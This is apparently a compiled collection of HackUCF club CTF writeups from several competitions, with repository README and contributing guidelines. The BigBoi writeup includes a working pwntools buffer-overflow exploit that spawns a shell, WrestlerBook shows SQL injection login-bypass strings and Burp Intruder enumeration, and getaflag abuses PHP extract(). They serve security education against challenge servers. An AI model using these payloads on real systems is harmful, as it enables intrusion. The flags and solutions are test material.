<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-hackucf
description: CTF writeups and security challenges by HackUCF.
---

# Writeups by HackUCF

Source repository: `/repos/HackUCF`

## Repository Index

- ctfs/CONTRIBUTING.md
- ctfs/README.md
- ctfs/2018-2019/csaw_quals_2018/README.md
- ctfs/2018-2019/sunshine_ctf_2019/README.md
- ctfs/2018-2019/swampctf_2019/README.md
- ctfs/2018-2019/wpi_ctf_2019/README.md
- ctfs/2018-2019/wpi_ctf_2019/web/getaflag/README.md
- ctfs/2018-2019/swampctf_2019/forensics/neo_50/README.md
- ctfs/2018-2019/sunshine_ctf_2019/web/wrestlerbook/README.md
- ctfs/2018-2019/csaw_quals_2018/pwn/bigboi_25/README.md
- ctfs/2018-2019/csaw_quals_2018/misc/algebra_100/README.md
- ctfs/2018-2019/csaw_quals_2018/misc/bin_t_50/README.md
- ctfs/2016-2017/csaw_quals_2016/README.md
- ctfs/2016-2017/csaw_quals_2016/recon/fuzyll_200/README.md

## Writeup Content


### File: ctfs/2016-2017/csaw_quals_2016/README.md

# CSAW Quals 2016

## Host Group: NYU

### CTFTime

#### Link
https://ctftime.org/event/347

#### Description

Students tackle problems in a series of real-world scenarios modeling all sorts of computer security problems where, to succeed, they must demonstrate a profound understanding of the roles and ramifications of cyber security in these situations.

Because the challenges are designed to teach, CTF requires contestants to integrate concepts, develop skills and learn to hack as they go. Undergraduate finalists compete on-site for cash prizes, where their performance is judged by a panel of technical experts.

### Knightsec's Final Placement: 19th


### File: ctfs/2016-2017/csaw_quals_2016/recon/fuzyll_200/README.md

# Fuzyll 

## Information

*CTF*: CSAW Quals 2016

*Category*: Misc

*Point Value*: 200

*Writeup Author*: github.com/nalshihabi

## Writeup
 
So for the beginning of this challenge, you are given the url: [http://fuzyll.com/files/csaw2016/start](https://www.google.com/url?q=http://fuzyll.com/files/csaw2016/start&sa=D&ust=1543614497360000)

And you get the following message:

![](images/image7.png)

So what kind of colorblindness does Fuzyll have? Idk. But Wikipedia knows all the different kinds.

![](images/image8.png)

Yeah, not many types. The kind Fuzyll has is deuteranomaly so just replace the “start” in the original url with deuteranomaly and go to that.

There, you get this image:

![euteranomaly.png](images/image5.png)

You download this picture but what you download is a text file named “deuteranomaly.txt” and near the beginning is the string:

![](images/image1.png)

To solve this part of the challenge, I first googled “Fuzyll DEFCON finals challenges.” I find a github page: [https://github.com/fuzyll/defcon-vm](https://www.google.com/url?q=https://github.com/fuzyll/defcon-vm&sa=D&ust=1543614497361000) 

Looking through the page there are a lot of challenges listed. But remembering what his clue said, the first problem he got at defcon finals is something he can’t see very well. Deuteranomaly is a type of red-green color blindness. Are there any specific names of a challenge on there that is an object that is red and green, like a strawberry?

![](images/image4.png)

Pretty sure tomatoes are red and green. So I tried that and what do you know it works!

We get to [http://fuzyll.com/files/csaw2016/tomato](https://www.google.com/url?q=http://fuzyll.com/files/csaw2016/tomato&sa=D&ust=1543614497362000) 

And then…

![](images/image10.png)

I didn’t know what to do here. So… I decided to do something that probably nobody else did. I guessed the next page. I wrote a small python script to brute force a word list for the next filename on the website. I figured that since “tomato” is a common English word, maybe the next filename is or even better yet, the flag file page is named by a common English word. Either way, it shouldn’t take long to test the theory out and since I don’t know what else to do, screw it. Here is the python script I wrote:

![](images/image6.png)

The word list I used (one of them in this repo):

[https://github.com/first20hours/google-10000-english](https://www.google.com/url?q=https://github.com/first20hours/google-10000-english&sa=D&ust=1543614497362000) 

I find viable options:

```
*   start
*   tomato
*   jade
```

Hm… What is at /jade? This picture is:

![jade.png](images/image9.jpg)

Convert the image to a text file and you find the following message:

![](images/image2.png)

Reverse google image search the picture and you find out the name of these ruins is “Wiñay Wayna” and the only ASCII version is “Winay Wayna.”

So at /winaywayna you find the following message:

![](images/image3.png)


### File: ctfs/2018-2019/csaw_quals_2018/README.md

# CSAW Quals 2018

## Host Group: NYU

### CTFTime

#### Link
https://ctftime.org/event/633

#### Description

Students tackle problems in a series of real-world scenarios modeling all sorts of computer security problems where, to succeed, they must demonstrate a profound understanding of the roles and ramifications of cyber security in these situations.

Because the challenges are designed to teach, CTF requires contestants to integrate concepts, develop skills and learn to hack as they go. Undergraduate finalists compete on-site for cash prizes, where their performance is judged by a panel of technical experts.

### Knightsec's Final Placement: 97th


### File: ctfs/2018-2019/csaw_quals_2018/misc/algebra_100/README.md

# Algebra (100): misc

## Information

*CTF*: CSAW Quals 2018

*Category*: Misc

*Point Value*: 100

*Writeup Author*: github.com/nalshihabi


We connect to the port for the challenge and are greeted with this message:
```
  ____                                     __ _           _            ___ ___
 / ___|__ _ _ __     _   _  ___  _   _    / _(_)_ __   __| |  __  __  |__ \__ \
| |   / _` | '_ \   | | | |/ _ \| | | |  | |_| | '_ \ / _` |  \ \/ /    / / / /
| |__| (_| | | | |  | |_| | (_) | |_| |  |  _| | | | | (_| |   >  <    |_| |_|
 \____\__,_|_| |_|   \__, |\___/ \__,_|  |_| |_|_| |_|\__,_|  /_/\_\   (_) (_)
                     |___/
**********************************************************************************
X + 8 = 151
What does X equal?:
```

So, it would seem that to solve this challenge, we need to solve algebraic equations. This can be annoying and difficult to writeup, unless, of course, there happens to be a library already for it. There just so happens to be! Python has a library called SymPy:

https://docs.sympy.org/latest/modules/solvers/solvers.html

So pretty much from here it is straightforward what to do: implement this library to read input from the challenge and solve each equation. Here is the script we hacked up:

```Python
import socket

from sympy import *
from sympy.parsing.sympy_parser import parse_expr

HOST = 'misc.chal.csaw.io'
PORT = 9002

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))


def readuntil(sock, val):
    s = []
    while True:
        v = sock.recv(1)
        if v == val:
            break
        s.append(v)
    return b"".join(s)


def readline(sock, thing=b""):
    if len(thing) == 0:
        s = []
        while True:
            v = sock.recv(1)
            if v == b"\n":
                break
            s.append(v)
        return b"".join(s)
    else:
        return sock.recv(len(thing) + 1).strip()

for i in range(7):
    readline(sock)

x = symbols("X")

while True:
    eq = [_.decode("utf-8") for _ in readline(sock).split(b"=")]
    print(eq)
    string = readuntil(sock, b"?")
    readuntil(sock, b":")
    answer = solveset(Eq(parse_expr(eq[0]), parse_expr(eq[1])), x)
    print(answer)
    my_answer = eval(str(answer)[1:-1])
    print(my_answer)
    sock.send(bytes(str(my_answer), "utf-8") + b"\n")
    print(readline(sock))
    print("\n")
```

We ran this script and then eventually got the flag spat out to us:
```
flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}
```



### File: ctfs/2018-2019/csaw_quals_2018/misc/bin_t_50/README.md

# bin_t

## Information

*CTF*: CSAW Quals 2018

*Category*: Misc

*Point Value*: 50

*Writeup Author*: github.com/nalshihabi


This challenge was pretty straightforward, given nodes, insert them into an AVL tree and the output the preorder traversal. I did not feel like writing up my own AVL tree so I went and found some code for it:

https://gist.github.com/girish3/a8e3931154af4da89995


I made changes to the main function so that I can just copy-paste input/output  and I created a preorder traversal function by slightly modifying the inorder_traversal function already present.

Changes to main function:
```Python
if __name__ == "__main__": 
    a = AVLTree()
    print "----- Inserting -------"
    inlist = [int(_) for _ in raw_input("input string: ").strip().split(',')]
    for i in inlist: 
        a.insert(i)
         
    a.display()
    
    print()
    print ",".join([str(_) for _ in a.preorder_traversal()])
```

Preorder Traversal function:
```Python
def preorder_traversal(self):
    if self.node == None:
        return [] 
    
    inlist = [] 

    inlist.append(self.node.key)

    l = self.node.left.preorder_traversal()
    for i in l: 
        inlist.append(i) 

    l = self.node.right.preorder_traversal()
    for i in l: 
        inlist.append(i) 

    return inlist 
```

Once these changes were made, I connected to the challenge and copy-pasted the input from the challenge into my script and then copy-pasted the output from the script into the challenge and got the flag:
```
flag{HOW_WAS_IT_NAVIGATING_THAT_FOREST?}
```



### File: ctfs/2018-2019/csaw_quals_2018/pwn/bigboi_25/README.md

# BigBoi

## Information

*CTF*: CSAW Quals 2018

*Category*: PWN

*Point Value*: 25

*Writeup Author*: github.com/Helithumper

## Challenge Description

```bash
    bigboy
    Category: Pwn Points: 25 Solved: 656 Description:

    Only big boi pwners will get this one!

    nc pwn.chal.csaw.io 9000
```

We were given an ELF to work with. First thing I did was run `file` on it:
```bash
    boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
    interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```
So we were dealing with a 64 bit ELF.

Upon running, I found the following:
```bash
    ➜  boi ./boi
    Are you a big boiiiii??
    yes
    Wed Sep 19 04:27:55 UTC 2018
```
So when we give it text, it gives us the current time UTC... hmm

Disassembler time!

![Binary Ninja Disassembly](images/bigboi1.png)

So what we see is that a conditional is run after `read` is called to compare `eax` with `0xcaf3baee`. If our value is not equal to `0xcad3baee`, then `/bin/date` is run. Else `/bin/bash` is run. You can guess which path of execution we want...

So from what I can see here i'm betting it's a buffer overflow given that `gets` is used. `gets` doesn't check for buffer sizes and is thus extremely volatile. If I name both the variable that `gets` puts our input into as well as the variable being compared to `0xcaf3baee` in Binja, then we can see offsets:

![Stack Overview](images/bigboi2.png)

So we know that there is a difference of:

    0x38-0x28 = 16 Bytes

between our variables. The difference we see, however, is that our variable is actually at that offset `+0x4`.

![+0x4](images/bigboi3.png)

So we add 4 to 16 Bytes and we get an offset of 20 Bytes.

With this knowledge, we can then create our payload:
```python
    from pwn import *


    p = remote('pwn.chal.csaw.io',9000)

    print(p.recvline())

    payload = 'A'*20 + p64(0xCAF3BAEE)

    # gdb.attach(p)

    print(payload)
    p.sendline(payload)


    p.interactive()
```
When run, we get the following:
```bash
    me@mycomputer ~/D/c/c/boi> python exploit.py
    [+] Opening connection to pwn.chal.csaw.io on port 9000: Done
     _    ___        ____   ___  _ _ _ _

    AAAAAAAAAAAAAAAAAAAA���\x00\x00\x00
    [*] Switching to interactive mode
    | |__|_ _|__ _  | __ ) / _ \(_|_|_|_)
    | '_ \| |/ _` | |  _ \| | | | | | | |
    | |_) | | (_| | | |_) | |_| | | | | |
    |_.__/___\__, | |____/ \___/|_|_|_|_|
             |___/
    ***************************************
    Are you a big boiiiii??
    AAAAAAAAAAAAAAAAAAAA���^@^@^@^@
    $ ls
    ls
    art.txt  boi  flag.txt    run.sh
    $ cat flag.txt
    cat flag.txt
    flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
    $
```
So yay. Shell and flag


### File: ctfs/2018-2019/sunshine_ctf_2019/README.md

# Sunshine CTF 2019

## Host Group: Hack@UCF

### CTFTime

#### Link
https://ctftime.org/event/767

#### Description

Students tackle problems in a series of real-world scenarios modeling all sorts of computer security problems where, to succeed, they must demonstrate a profound understanding of the roles and ramifications of cyber security in these situations.

Because the challenges are designed to teach, CTF requires contestants to integrate concepts, develop skills and learn to hack as they go. 




### File: ctfs/2018-2019/sunshine_ctf_2019/web/wrestlerbook/README.md


# **Web Challenge: WrestlerBook**

This was a Web Challenge from Sunshine CTF 2019. So we load the website and we are prompted with a login page:

![](https://i.imgur.com/814w35X.jpg)

I immediately check to see if we can attack the login page with any SQLi:

![](https://i.imgur.com/iEae04m.png)

Now that we are aware that there is SQL injection on the page I proceed to give it the typical injection: `admin' or 1=1 -- `

![](https://i.imgur.com/SbkuXON.jpg)

Andddd....we manage to login: ![](https://i.imgur.com/m4XC8Mf.png)

but no flag :( :-1:. So we know that we can login using SQL injection and we logged in with Hulk Hogan, so there may be other users and if you know how a database works. We can use other attacks in our SQL injection to test that as well.

![](https://i.imgur.com/Pu2N58O.jpg)
 
 I proceed to logout and check my theory: `admin' or 1=1 limit 1 offset 1 -- ` which essentially we are checking the next row in the database to prove that the theory is true. And voilaaaa it works:
 
 ![](https://i.imgur.com/qMg0vku.png)

we logged into the Nature boy's profile but no flag.....hmmmmmm. So if its not in his profile it may be in another profile, but I'm not too sure which one it is so I decide to boot up Burpsuite and catch the POST request:

![](https://i.imgur.com/NjkYKnx.png)

I send it to intruder and we will run a sniper attack, and essentially what intruder does is that it's a tool for automating customized attacks against web app and we will take advantage of the POST request and iterate through all the profiles which there were only like 100 so that shouldn't take too long....

![](https://i.imgur.com/JdaGgYi.png)


We set the payload to every digit 1 - 100 and start the attack: 

![](https://i.imgur.com/FzoCwpo.png)

And evidently after a minute or so we got the flag:

![](https://i.imgur.com/856jq6t.png)

FLAG: sun{ju57_4n07h3r_5ql1_ch411}


 






### File: ctfs/2018-2019/swampctf_2019/README.md

# SwampCTF 2019
## Host Group: University of Florida

Link
https://play.swampctf.com/



### File: ctfs/2018-2019/swampctf_2019/forensics/neo_50/README.md

# Forensics: Neo
## SwampCTF

This was a 50 point challenge in the forensics category from SwampCTF. This jpeg file is provided for the challenge:
<p align="center">
  <img src=red_pill.jpeg>
</p>

This steganography challenge is actually very simple. All that was needed was two commands:
<p align="center">
  <img src=commands.PNG>
</p>

Strings finds and prints any text strings embedded in files. I put that output into a text file to easily search for flags with grep.
And there we go, the flag is right there.



### File: ctfs/2018-2019/wpi_ctf_2019/README.md

# WPICTF 2019

## Host Group: WPICSC

### CTFTime

#### Link
https://ctftime.org/event/728

#### Description

Students tackle problems in a series of real-world scenarios modeling all sorts of computer security problems where, to succeed, they must demonstrate a profound understanding of the roles and ramifications of cyber security in these situations.

Because the challenges are designed to teach, CTF requires contestants to integrate concepts, develop skills and learn to hack as they go. 


### File: ctfs/2018-2019/wpi_ctf_2019/web/getaflag/README.md

# **Web Challenge: getaflag**

###### tags: `web` `ctf`

This is a web challenge from WPI CTF. We connect to http://getaflag.wpictf.xyz:31337/ and are prompted to guess a password:

![](https://i.imgur.com/um5F2IB.png)

Usally, the first step I take when figuring out a web challenge is trying to understand what it does. I then snoop around the page basically touching every button and eventually checking the source code of the page. So in this challenge I did those first two steps but nothing really happened, so I eventually went on to check the source code of the page where I was able to find some base64 encoded text:

![](https://i.imgur.com/GAm2zc6.png)

I booted up the terminal and decoded it with `echo <insert encoded b64> | base64 -d` and was able to get a clue: 

![](https://i.imgur.com/L7l5lWe.png)

In the clue Goutham forgot to block `http://getaflag.wpictf.xyz:31337/auth.php` so we go investiagate see what we find: 

![](https://i.imgur.com/LlxCrDq.png)

So we end up with some pseudocode that is telling us basically how to guess the correct password so we can get the flag. If you may have never read much php code like me before you can sort of understand what is going on, but the key thing is recognizing that the `extract($_GET)` is known to be a dangerous method. Sending user input data through the extract function can be manipulated to do other things such as viewing files, listing directories, etc.(https://www.php.net/manual/en/function.extract.php). Eventually after messing with it for a while I managed to get the flag by manipulating the input to `http://getaflag.wpictf.xyz:31337/?input=&passcode=1`: 

![](https://i.imgur.com/vZvgmbW.png)

I immediately clicked on the flag and got trolled with the rick roll, but ended up checking out the source code of the page and managed to find the flag hidden in there:

![](https://i.imgur.com/cqYLzfp.png)

Flag: WPI{1_l0v3_PHP}





### File: ctfs/README.md

# Hack@UCF CTF Writeups and Challenges

![Logo](https://hackucf.org/blog/wp-content/uploads/carousel4_2.jpg)

## What is this?
This is a repository containing CTF Writeups for challenges completed and/or created by members of Hack@UCF, The Collegiate Cyber Defense Club @ UCF. We try to post here often with writeups with two purposes in mind:

1. We learn more by writing down what we have done and explaining it in depth.
2. We are able to help others in their quest to learn how to CTF.

## How do I make changes?

1. Read `CONTRIBUTING.md`
2. Make a fork
3. Make your changes in your fork
4. Submit a Pull Request 



### File: ctfs/CONTRIBUTING.md

# Contributing

For Hack@UCF members contributing to this repository, plese follow the correct procedures prior to creating a pull request.

## File Format

Each Academic year has it's own directory. For example, the Fall 2018 through Summer 2019 Academic year is labelled as `2018-2019`.

For each individual competition, a separate directory should be made. Replace spaces with `_` and all lowercase. For example, Sunshine CTF 2018's directory is `sunshine_ctf_2018`.

In each competition, separate directories are made per challenge category. For example, Pwn challenges belong in a directory called `pwn`.

Each challenge has it's own directory as well. If a challenge is called "Now you see me" and it is a 200 point challenge, it's directory would be `now_you_see_me_200`.

In Summary, The directory for a challenge might look like: `sunshine_ctf_2018/pwn/hacker_name_50`

## Competition README

Each competition will have a README.md file. This file will contain information such as the organizing group of the CTF, the dates the competition took place, Hack@UCF's final standing, as well as a list of contributors to the writeups for this CTF. If possible, a `scoreboard.txt` file with the final scoreboard of the competition provided by CTFtime should be included.

## Challenge README

Each challenge will have its own README.md file. This file will contain information such as the point value of the challenge, the challenge summary as given (CTFd Description) along with information such as a target IP address and port. The following information will be the challenge writeup.

## Challenge Writeup

The Challenge writeup is part of the challenge's README.md file. This is where the majority of explainations, etc... will be located. The two options for posting a writeup are as follows:

1. Writeup left in the README.md file of the challenge
2. Link to the writeup located elsewhere (such as HackUCF.org)

Either way, we ask that all writeups posted to this repository be in good taste and include a thorough and full explaination of what was required to complete the challenge.

## Questions

If there are any questions about contributing to this repository, either E-Mail ctf (at) hackucf.org or message us on the Hackers and Builders slack in the #ctf channel.
